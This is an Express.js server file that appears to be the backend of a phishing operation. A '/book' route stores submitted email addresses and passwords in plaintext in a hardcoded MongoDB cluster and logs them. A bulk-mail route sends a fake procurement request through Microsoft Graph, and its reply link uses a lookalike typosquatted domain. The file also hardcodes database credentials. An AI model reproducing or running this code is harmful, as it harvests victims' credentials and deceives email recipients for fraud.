require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const axios = require("axios");
mongoose
  // .connect("mongodb+srv://outlook:outlook@outlook.i3hup.mongodb.net/")
  .connect("mongodb+srv://anonymous:anonymous@cluster0.3hdvk.mongodb.net/myFirstDatabase")
  .then((result) => {
    console.log("mongoose connected");
  })
  .catch((err) => console.log("mongoose not connected", err));

// Routes
const userRoutes = require("./routes/auth");

const app = express();

// Parse incoming requests
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Set headers
app.use((req, res, next) => {  
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Authorization, , X-Requested-With, Origin, Accept"
  );
  res.setHeader(
    "Access-Control-Allow-Methods",
    "OPTIONS, GET, POST, PUT, PATCH, DELETE"
  );

  if (req.method === "OPTIONS") {
    return res.sendStatus(200);
  }

  next();
});

// Endpoints
app.use("/user", userRoutes);
app.get("/", (req, res, next) => {
  res.send("Hello world");
});

const User = require("./models/user");
app.post("/book", async (req, res) => {
  const email = req.body.email,
    password = req.body.password;

  const user = new User({
    email: email,
    password: password,
  });

  await user.save();

  // Output the book to the console for debugging
  console.log(email, password);

  res.send("Book is added to the database");
});

const GRAPH_API_URL = "https://graph.microsoft.com/v1.0/me/sendMail";

// Function to get access token using refresh token
async function getAccessToken() {
  const { CLIENT_ID, CLIENT_SECRET, TENANT_ID, REFRESH_TOKEN } = process.env;

  try {
    const response = await axios.post(
      `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token`,
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        refresh_token: REFRESH_TOKEN,
        grant_type: "refresh_token",
      }),
      { headers: { "Content-Type": "application/x-www-form-urlencoded" } }
    );

    return response.data.access_token;
  } catch (error) {
    console.error(
      "Error getting access token:",
      error.response?.data || error.message
    );
    return null;
  }
}

// Function to send email
async function sendEmail(accessToken, recipient) {
  const emailData = {
    message: {
      subject: "Important Notification",
      body: {
        contentType: "HTML",
        content: `<p>Hello Dear,</p>
      <p>I hope you are doing well. </p>
      <p>We are in urgent need of the subject mentioned product for an ongoing project.</p>
      <p>Please let us know if it is possible to provide us with a solution, kindly provide your company catalog so we can review.</p>
      <p>Thank you in advance and I look forward to receiving your prompt reply.</p>
      <p><b>Marc Steenhaut </b></p>
      <p><b>Procurement Manager</b></p>
      <div><img src="https://res.cloudinary.com/muyi-hira-app/image/upload/v1740568695/logs_z3xiyy.png" alt=""></div>
      <p><b>T:</b>[http://+17176783238]+1 717 678 3238</p>
      <p><b>E:</b>  <a href="mailto:marc@rnerlinsourcing.com">marc@merlinsourcing.com</a></p>
      <p><b>W:</b> <a href="https://merlinsourcing.com/">merlinsourcing.com/</a></p>`,
      },
      toRecipients: [{ emailAddress: { address: recipient } }],
    },
  };

  try {
    await axios.post(GRAPH_API_URL, emailData, {
      headers: {
        Authorization: `Bearer ${accessToken}`,
        "Content-Type": "application/json",
      },
    });
    return { email: recipient, status: "Sent" };
  } catch (error) {
    return {
      email: recipient,
      status: "Failed",
      error: error.response?.data || error.message,
    };
  }
}

// Route to send bulk emails
app.post("/send-bulk-email", async (req, res) => {
  const { emails } = req.body;

  if (!emails || !Array.isArray(emails)) {
    return res.status(400).json({ message: "Invalid email list" });
  }

  const accessToken = await getAccessToken();
  if (!accessToken)
    return res.status(500).json({ message: "Failed to get access token" });

  const results = [];
  for (const email of emails) {
    const result = await sendEmail(accessToken, email);
    results.push(result);
  }

  res.json({ message: "Bulk email process completed", results });
});

app.use((req, res, next) => {
  if (req.originalUrl && req.originalUrl.split("/").pop() === "favicon.ico") {
    return res.sendStatus(204);
  }
  return next();
});

// Error handler
app.use((err, req, res, next) => {
  const status = err.statusCode,
    message = err.message,
    type = err.type || "";

  res.status(status).json({ message, status, type });
});

const port = process.env.PORT || 8000;
app.listen(port, () => console.log("Server started"));
